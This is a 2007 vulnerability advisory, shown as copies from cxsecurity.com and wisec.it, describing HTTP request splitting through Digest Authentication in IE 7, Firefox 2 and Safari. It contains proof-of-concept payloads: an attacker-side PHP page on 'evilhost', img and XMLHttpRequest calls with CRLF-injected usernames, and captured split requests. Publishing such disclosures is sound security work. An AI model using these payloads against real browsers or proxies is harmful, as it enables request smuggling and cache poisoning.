=== Content from securityreason.com_a37c39df_20250125_175556.html ===

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  | | **IE 7 and Firefox Browsers Digest Authentication Request Splitting** **2007.05.02** Credit:  **[Stefano Di Paola](https://cxsecurity.com/author/Stefano%2BDi%2BPaola/1/)**  Risk: **Medium** Local: **No** Remote: ****Yes**** CVE: **[CVE-2007-2292](https://cxsecurity.com/cveshow/CVE-2007-2292/ "Click to see CVE-2007-2292")** | **[CVE-2007-2291](https://cxsecurity.com/cveshow/CVE-2007-2291/ "Click to see CVE-2007-2291")** CWE: **N/A** | | --- | |
| --- | --- | --- | --- |

 Title IE 7 and Firefox Browsers Digest Authentication
Request Splitting
Systems Affected Internet Explorer 7.0.5730.11
FF 2.0.0.3
Severity Medium
Vendor http://www.microsoft.com/ & http://www.mozilla.com
Advisory http://www.wisec.it/vulns.php?id=11
Authors Stefano `Wisec` Di Paola (stefano.dipaola (at) wisec (dot) it [email concealed])
Discovery Date 20070213
Release Date 20070425
I) Short description
Firefox and Internet Explorer are prone to Http Request Splitting when
Digest Authentication occurs. If anyone wants to know about HTTP Request
Splitting, HTTP Request Splitting attacks are described in various
papers and advisories:
1. http://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf
2.
http://www.webappsec.org/lists/websecurity/archive/2006-07/msg00069.html
3. http://download2.rapid7.com/r7-0026/
4. http://www.wisec.it/docs.php?id=4
(About Auto Injection with Req.Split.)
II) Long description
As explained in Rfc2617 (http://www.ietf.org/rfc/rfc2617.txt) Digest
Authentication is a more secure way to exchange user credentials.
Rfc uses the following example:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
The first time the client requests the document, no Authorization
header is sent, so the server responds with:
HTTP/1.1 401 Unauthorized
WWW-Authenticate: Digest
realm="testrealm (at) host (dot) com [email concealed]",
qop="auth,auth-int",
nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
opaque="5ccc069c403ebaf9f0171e9517f40e41"
The client may prompt the user for the username and password, after
which it will respond with a new request, including the following
Authorization header:
Authorization: Digest username="Mufasa",
realm="testrealm (at) host (dot) com [email concealed]",
nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",
uri="/dir/index.html",
qop=auth,
nc=00000001,
cnonce="0a4f113b",
response="6629fae49393a05397450978507c4ef1",
opaque="5ccc069c403ebaf9f0171e9517f40e41"
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
So there's a response by the client (browser) with username in clear.
There are two ways to send credentials in html/javascript:
XMLHttpRequest("GET","page",async, "user","pass");
And with img/iframes or related:
<img src="http://user:pass@host/paget">
But what if the username contains rn or urlencoded %0d%0a?
Let's use an Evil page like this:
--8<-- http://evilhost/req.php --8<--8<--8<--8<--8<--8<--8<--8<--8<--
<?php
header('Set-Cookie: PHPSESSID=6555');
if((int)intval($\_COOKIE['PHPSESSID']) !== 6555){
header('HTTP/1.0 401 Authorization Required");
header('WWW-Authenticate: Digest realm="1 (at) example (dot) com [email concealed]", qop="auth,auth-int", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",opaque="5ccc069c403ebaf9f0171
e9517f40e41"');
header('Proxy-Connection: keep-alive');
} else {
// header("Set-Cookie: PHPSESSID=0");
}
header('Connection: keep-alive');
?>
<html><head>
<meta http-equiv='Connection' content="keep-alive"></head>
<body><script>
// Some Printing in order to show document DOM properties
// in the poisoned page
for(var i in document)
document.write(i+' '+eval('document.'+i)+'<br>');
</script>
</body>
</html>
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
Which asks for a digest authentication only once.
III) Direct URL Authentication
Let's try it with Firefox:
<img id="d" src="http://user%0aname:pp@evilhost/req.php">
Let's see what happens after the first request:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
HTTP/1.1 401 Authorization Required
Set-Cookie: PHPSESSID=6555
WWW-Authenticate: Digest realm="1 (at) example (dot) com [email concealed]",
qop="auth,auth-int",nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",opaque="5
ccc069c403ebaf9f0171e9517f40e41"
Proxy-Connection: keep-alive
Connection: keep-alive, Keep-Alive
Content-Length: 146
Keep-Alive: timeout=15, max=100
Content-Type: text/html; charset=UTF-8
...
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
and then Firefox resend its request:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
GET req.php HTTP/1.1
Host: at.tack.er
User-Agent: Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.3)
Gecko/20060601 Firefox/2.0.0.3 (Ubuntu-edgy)
Keep-Alive: 300
Connection: keep-alive
Authorization: Digest username="user
name", realm="1 (at) example (dot) com [email concealed]",
nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/req.php",
response="e398c5c7583b4ca115978c486bb766f8",
opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=00000001,
cnonce="58e1c23271698745"
Cookie: PHPSESSID=6555
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
Everyone can see there's a splitting where the %0a was.
The rest of the story is straightforward, an attacker could inject a
second request, and in presence of a proxy (about 2 million people use
it), a request splitting attack could be accomplished.
IV) Firefox Add-On
A redirection could be used:
<img src="http://evilhost/redir.php">
With redir.php :
<?php
header("Location: http://user%0aname:ds@avilhost/req.php");
?>
Or by using various redirectors around the web.
Note: Internet Explorer 7 is not vulnerable with imgs nor with other
direct requests.
V) XMLHttpRequest Authentication
IE 7 and Firefox are both vulnerable.
Let's use a standard request with XMLHttpRequest:
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
x=new XMLHttpRequest();
x.open("POST","req.php?",false,"userrnname","pass");
x.setRequestHeader("Proxy-Connection","keep-alive");
x.onreadystatechange=function (){
if (x.readyState == 4){
}
}
// The payload with a request to a page with evil content
x.send("RequestPayload");
--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--
This will result in a similar splitting like the one with images tags.
What you could do with these splittings? A lot, one for all is that in
presence of a proxy, local cache could be poisoned. But for some more
attack have a look at references.
Note: there is some difference between IE and Firefox, but i'll let you
as homework
CREDIT
------
Stefano di Paola is credited with the discovery of this vulnerability.
LEGAL NOTICES
--------------
Copyright (c) 2007 Stefano di Paola
Note: this exploit is DUAL LICENSED,
1. if you'll use it for personal and non-profit purposes you can
apply GPL v2 and above.
2. In the case you plain to:
a. use our code in any commercial context
b. implement this code in your non-GPL application
c. use this code during a Penetration Test
d. make any profit from it
you need to contact me in order to obtain a \_commercial license\_.
For more Informations about Dual Licensing:
http://producingoss.com/html-chunk/dual-licensing.html
Permission is granted for the redistribution of this alert
electronically. It may not be edited in any way without my express
written consense. If you wish to reprint the whole or any
part of this alert in any other medium other than electronically, please
email me for permission.
Disclaimer: The information in the advisory is believed to be accurate
at the time of publishing based on currently available information. Use
of the information constitutes acceptance for use in an AS IS condition.
There are no warranties with regard to this information. Neither the
author nor the publisher accepts any liability for any direct, indirect,
or consequential loss or damage arising from use of, or reliance on,
this information.
--
...oOOo...oOOo....
Stefano Di Paola
Software & Security Engineer
Web: www.wisec.it
..................
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1.4.3 (GNU/Linux)
iD8DBQBGL5HWfSCEH5yFF2MRAgVfAJ47gkj/Yw0HFSzizk4Hi+AWe5aiQgCbBfTQ
Pyi025+kLyUB6oT1919PDi4=
=cwhV
-----END PGP SIGNATURE-----

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2007050008)
[Tweet](https://twitter.com/share)

Vote for this issue:

 0
 0

50%
50%

#### **Thanks for you vote!**

#### **Thanks for you comment!**Your message is in quarantine 48 hours.

Comment it here.
Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  | **{{ x.nick }}**  | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---  {{ x.comment }} |
| --- | --- |

Show all comments

---

Copyright **2025**, cxsecurity.com

  |  |
Back to Top



=== Content from cxsecurity.com_62c25889_20250126_104609.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---



=== Content from www.wisec.it_43fd8362_20250125_175557.html ===

THP
[Wisec](http://www.wisec.it/)
[USH](http://www.ush.it/)
[DigitalBullets](http://www.digitalbullets.org/)
[TheHackersPlace](http://www.thehackersplace.org/)
[network](http://network.ush.it/)

| The ***WI***se ***SEC***urity | [.italian](?id=11&lang=it) [.english](?id=11&lang=en) |
| --- | --- |

[Wisec Home](/index.php)
[SecSearch](/search/ "WorldWideSecurity Search Engine")
[Projects](/projects.php)
[Papers](/docs.php)
[Security Thoughts](/sectou.php)

| News   [Flash Application Testing: A New Vector for XSS and Cross Site Flashing.](/sectou.php?id=464dd35c8c5ad "The Presentation i did at Owasp AppSec 2007 in Milan") [IE and Firefox Digest Authentication Request Splitting.](/vulns.php?id=11 "Cross Browser Digest Authentication Request Splitting.") [Php import\_req\_var globals overwrite Advisory.](/vulns.php?id=10 "Php import_req_var globals overwrite Advisory.") [Subverting Ajax - The Paper.](/docs.php?id=4 "Download Wisec's Subverting Ajax Paper presented at 23C3") [Adobe Plugin Multiple Vulnerabilities.](/vulns.php?page=9 "Adobe Plugin Multiple Vulnerabilities") [Wisec@23rd.CCC Congress in Berlin - 29th Dec. 2006 - Subverting Ajax.](/news.php "Wisec@23rd.CCC Congress in Berlin!") [SecSearch. Search Engine for Security Community.](/search/ "New! A Search Engine For Security Community!") [Mysql COM\_TABLE\_DUMP Flaws.](/vulns.php?page=8 "Mysql COM_TABLE_DUMP Flaw") [Mysql Anonymous login Flaw.](/vulns.php?page=7 "Mysql Anonymous login Flaw") [A new project to stop embed passwords in Php scripts: PassBroker.](/projects.php "A new project to stop embed passwords in Php scripts: PassBroker") [MySQL new three vulnerabilities unleashed](/vulns.php "Vulnerabilities Page") [PHP shmop safemode bypass](/news.php?page=2 "Shmop PHP module vulnerability") [PHP RFC1867 Vuln - POC Released!](/news.php?page=1 "As new PHP Versions have been released... Here is Php File Upload rfc1867 Vunerability POC Released!")  Search on Wisec   Google | IE 7 and Firefox Browsers Digest Authentication Request SplittingUpdated on 27th April 2007 see updated details [here](#update)**Safari is also affected by this [issue](#update).** Title:IE 7 and Firefox Browsers Digest AuthenticationOriginal Discovery and Research:Stefano Di PaolaVulnerable:Internet Explorer 7.0.5730.11  Mozilla Firefox 2.0.0.3Severity:MediumVendor :http://www.microsoft.com/  http://www.mozilla.com/Type of Vulnerability:HTTP Request SplittingTested On :Firefox 2.0.0.3 under Windows XP SP2, Firefox 2.0.0.3 under Ubuntu 6.06, Internet Explorer SP2 under Windows XP SP2. Discovery Date :20070213Release Date :20070425I) Short description ```  Firefox and Internet Explorer are prone to Http Request Splitting when Digest Authentication occurs. If anyone wants to know about HTTP Request Splitting, HTTP Request Splitting attacks are described in various papers and advisories:   1. <http://www.securityfocus.com/archive/1/411585> 2. <http://www.webappsec.org/lists/websecurity/archive/2006-07/msg00069.html> 3. <http://download2.rapid7.com/r7-0026/> 4. [http://www.wisec.it/docs.php?id=4 (PDF, About Auto Injection with Req.Split.)](http://www.wisec.it/docs.php?id=4)   ``` II) Long description ```   As explained in Rfc2617 (http://www.ietf.org/rfc/rfc2617.txt) Digest Authentication is a more secure way to exchange user credentials.  Rfc uses the following example:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< The first time the client requests the document, no Authorization header is sent, so the server responds with:        HTTP/1.1 401 Unauthorized       WWW-Authenticate: Digest 	      realm="testrealm@host.com", 	      qop="auth,auth-int", 	      nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", 	      opaque="5ccc069c403ebaf9f0171e9517f40e41"   The client may prompt the user for the username and password, after which it will respond with a new request, including the following Authorization header:  Authorization: Digest username="Mufasa", 	realm="testrealm@host.com", 	nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", 	uri="/dir/index.html", 	qop=auth, 	nc=00000001, 	cnonce="0a4f113b", 	response="6629fae49393a05397450978507c4ef1", 	opaque="5ccc069c403ebaf9f0171e9517f40e41"  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<  So there's a response by the client (browser) with username in clear.  There are two ways to send credentials in html/javascript: XMLHttpRequest("GET","page",async, "user","pass");  And with img/iframes or related: <img src="http://user:pass@host/page">  But what if the username contains \r\n or urlencoded %0d%0a?  Let's use an Evil page like this:  --8<-- http://evilhost/req.php --8<--8<--8<--8<--8<--8<--8< <?php header('Set-Cookie: PHPSESSID=6555'); if((int)intval($_COOKIE['PHPSESSID']) !== 6555){  header('HTTP/1.0 401 Authorization Required");  header('WWW-Authenticate: Digest realm="1@example.com", \ qop="auth,auth-int", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093",\ opaque="5ccc069c403ebaf9f0171e9517f40e41"');  header('Proxy-Connection: keep-alive'); } else {  // header("Set-Cookie: PHPSESSID=0"); } header('Connection: keep-alive'); ?> <html><head> <meta http-equiv='Connection' content="keep-alive"></head> <body><script> // Some Printing in order to show document DOM properties // in the poisoned page for(var i in document) document.write(i+' '+eval('document.'+i)+'<br>'); </script> </body> </html>  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<  Which asks for a digest authentication only once.  ``` III) Direct URL Authentication ```   Let's try it with Firefox: <img  src="http://user%0aname:pp@evilhost/req.php">  Let's see what happens after the first request:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< HTTP/1.1 401 Authorization Required Set-Cookie: PHPSESSID=6555 WWW-Authenticate: Digest realm="1@example.com", qop="auth,auth-int",nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", opaque="5ccc069c403ebaf9f0171e9517f40e41" Proxy-Connection: keep-alive Connection: keep-alive, Keep-Alive Content-Length: 146 Keep-Alive: timeout=15, max=100 Content-Type: text/html; charset=UTF-8 ...  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<  and then Firefox resend its request:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8< GET /req.php HTTP/1.1 Host: at.tack.er User-Agent: Mozilla/5.0 (X11; U; Linux i686; it; rv:1.8.1.3) Gecko/20060601 Firefox/2.0.0.3 (Ubuntu-edgy) Keep-Alive: 300 Connection: keep-alive Authorization: Digest username="user name", realm="1@example.com", nonce="dcd98b7102dd2f0e8b11d0f600bfb0c093", uri="/req.php", response="e398c5c7583b4ca115978c486bb766f8", opaque="5ccc069c403ebaf9f0171e9517f40e41", qop=auth, nc=00000001, cnonce="58e1c23271698745" Cookie: PHPSESSID=6555  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<  Everyone can see there's a splitting where the %0a was.  The rest of the story is straightforward, an attacker could inject a second request, and in presence of a proxy (about 2 million people use it), a request splitting attack could be accomplished.  ``` IV) Firefox Add-On ```   A redirection could be used: <img  src="http://evilhost/redir.php">   With redir.php : <?php header("Location: http://user%0aname:ds@avilhost/req.php"); ?>  Or by using various redirectors around the web.  Note: Internet Explorer 7 is not vulnerable with imgs nor with other direct requests.  ``` V) XMLHttpRequest Authentication ```   IE 7 and Firefox are both vulnerable. Let's use a standard request with XMLHttpRequest:  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<-- x=new XMLHttpRequest(); x.open("POST","req.php?",false,"user\r\nname","pass"); x.setRequestHeader("Proxy-Connection","keep-alive"); x.onreadystatechange=function (){    if (x.readyState == 4){    } } // The payload with a request to a page with evil content x.send("RequestPayload");  --8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--8<--  This will result in a similar splitting like the one with images tags.  What you could do with these splittings? A lot, for example in the presence  of a proxy the local proxy cache could be poisoned. The previous references details this and other attacks.  Note: there is some difference between IE and Firefox, but it'll  be left as an exercise for the reader.  ``` Update**Thanks to Comcor for pointing me out about this** ```   It looks like Safari is also affected by this issue.  Request url:   http://user%0aX-Foobar%3A%20uhoh%0aAuthorization%3A%20Digest%20username="name:pass@evilhost.tld/foo/  GET /foo/ HTTP/1.1 Accept: */* Accept-Language: en User-Agent: Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3 Paros/3.2.13 Authorization: Digest username="user X-Foobar: uh-oh Authorization: Digest username=\"name", realm="private", nonce="8tV0WgcvBAA=3efa17bd9bf4ac5f2bb9169880d6737708acfee0", uri="/foo/", response="facc3cb14eb07ad325696d05223038d3", algorithm="MD5", cnonce="a6071432b914d781a08fe75ce2c13af7", nc=00000001, qop="auth" Connection: keep-alive Proxy-Connection: keep-alive Host: evilhost.tld   ``` LEGAL NOTICES ```  Copyright (c) 2007 Stefano di Paola  Note: this exploit is DUAL LICENSED,  1. if you'll use it for personal and non-profit purposes you can     apply GPL v2 and above.      2. In the case you plain to:     a. use our code in any commercial context    b. implement this code in your non-GPL application    c. use this code during a Penetration Test    d. make any profit from it        you need to contact me in order to obtain a _commercial license_.  For more Informations about Dual Licensing: [Here](http://producingoss.com/html-chunk/dual-licensing.html)  Permission is granted for the redistribution of this alert electronically. It may not be edited in any way without my express written consense. If you wish to reprint the whole or any part of this alert in any other medium other than electronically, please email me for permission.  Disclaimer: The information in the advisory is believed to be accurate at the time of publishing based on currently available information. Use of the information constitutes acceptance for use in an AS IS condition. There are no warranties with regard to this information. Neither the author nor the publisher accepts any liability for any direct, indirect, or consequential loss or damage arising from use of, or reliance on, this information.  ```  **Florence, 25th April 2007** Wisec is brought to you by... Wisec is written and mantained by Stefano Di Paola.  Wisec uses open standards, including XHTML, CSS2, and XML-RPC. |
| --- | --- |

All Rights Reserved 2004



=== Content from cxsecurity.com_2352b1ed_20250126_104608.html ===


---

# Security check:

Captcha. You know what to do. (CXSECURITYIDS)

---


